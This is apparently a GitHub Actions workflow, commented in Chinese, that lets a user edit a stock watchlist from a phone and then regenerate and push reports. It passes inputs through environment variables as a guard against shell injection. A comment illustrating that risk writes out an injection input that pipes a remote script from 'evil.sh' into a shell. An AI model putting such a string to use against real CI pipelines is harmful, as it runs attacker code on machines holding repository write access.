name: 管理追蹤名單

# 這個流程專門給手機用。到 Actions 分頁按「Run workflow」，
# 填好欄位送出，雲端就會幫你改設定、抓資料、重新產生報告並推上線。
on:
  workflow_dispatch:
    inputs:
      action:
        description: "要做什麼"
        required: true
        default: "只更新報告"
        type: choice
        options:
          - 只更新報告
          - 新增個股
          - 新增個股並建立季報
          - 建立或重建季報
          - 隱藏個股
          - 恢復顯示
          - 移除個股
          - 列出目前名單
      code:
        description: "股票代號或檔名代號（例如 4063 或 shinetsu）"
        required: false
        type: string
      price_buy:
        description: "股價布局參考線（選填，新增個股時用）"
        required: false
        type: string
      per_buy:
        description: "本益比布局參考線（選填，留空用預設 20）"
        required: false
        type: string
      years:
        description: "季報回溯年數（預設 2）"
        required: false
        default: "2"
        type: string

permissions:
  contents: write

concurrency:
  group: market-monitor-write
  cancel-in-progress: false

jobs:
  manage:
    runs-on: ubuntu-latest
    env:
      JQUANTS_API_KEY: ${{ secrets.JQUANTS_API_KEY }}
    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-python@v6
        with:
          python-version: "3.12"

      # 輸入一律走 env，不直接內插進 run 的 shell body。
      #
      # `${{ }}` 是在 shell 看到這段文字**之前**就被展開的——等於把使用者打的字
      # 直接貼進腳本裡。一個 `1; curl evil.sh | sh` 就會在這台握有
      # contents: write 的 runner 上執行。走 env 之後那些字只是變數的值，
      # 再怎麼寫都只是一串字元。
      - name: 執行指定的動作
        env:
          IN_ACTION: ${{ inputs.action }}
          IN_CODE: ${{ inputs.code }}
          IN_YEARS: ${{ inputs.years }}
          IN_PRICE_BUY: ${{ inputs.price_buy }}
          IN_PER_BUY: ${{ inputs.per_buy }}
        run: |
          set -e
          ACTION="$IN_ACTION"
          CODE="$IN_CODE"
          YEARS="$IN_YEARS"
          # 代號只允許數字與英文字母（上櫃有 6xxxL 這種）。這一關擋的不是注入
          # ——env 已經擋掉了——而是「把一坨奇怪的字送進 manage_stock.py」。
          if [ -n "$CODE" ]; then
            case "$CODE" in
              *[!0-9A-Za-z]*)
                echo "::error::股票代號只能是數字或英文字母，收到的是：$CODE"
                exit 1 ;;
            esac
          fi
          EXTRA=""
          if [ -n "$IN_PRICE_BUY" ]; then EXTRA="$EXTRA --price-buy $IN_PRICE_BUY"; fi
          if [ -n "$IN_PER_BUY" ]; then EXTRA="$EXTRA --per-buy $IN_PER_BUY"; fi

          case "$ACTION" in
            "新增個股")
              python manage_stock.py add "$CODE" $EXTRA ;;
            "新增個股並建立季報")
              python manage_stock.py add "$CODE" --build --years "$YEARS" $EXTRA ;;
            "建立或重建季報")
              python manage_stock.py build "$CODE" --years "$YEARS" ;;
            "隱藏個股")
              python manage_stock.py hide "$CODE" ;;
            "恢復顯示")
              python manage_stock.py show "$CODE" ;;
            "移除個股")
              python manage_stock.py remove "$CODE" ;;
            "列出目前名單")
              python manage_stock.py list ;;
            *)
              echo "只更新報告，不改名單" ;;
          esac

      - name: 目前名單
        run: python manage_stock.py list

      - name: 更新資料並產生報告
        id: update
        if: inputs.action != '列出目前名單'
        run: python run.py update

      # 為什麼要 `|| steps.update.outcome == 'failure'`：
      #
      # 上面「執行指定的動作」那一步**已經改好 config.json 了**。如果報告產不
      # 出來（來源掛掉、網路不通）就跳過提交，使用者從手機加的那一檔股票會
      # 靜靜地消失——他看到的是一個綠色的 job，然後名單裡沒有那檔。
      #
      # 名單的改動與報告能不能產生是兩件事。名單先存起來，報告下一次排程會補。
      - name: 有變動才提交
        if: inputs.action != '列出目前名單' && (success() || steps.update.outcome == 'failure')
        env:
          IN_ACTION: ${{ inputs.action }}
          IN_CODE: ${{ inputs.code }}
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          if git diff --staged --quiet; then
            echo "沒有變動，這次不提交。"
          else
            git commit -m "手機操作：${IN_ACTION} ${IN_CODE}"
            git push
          fi
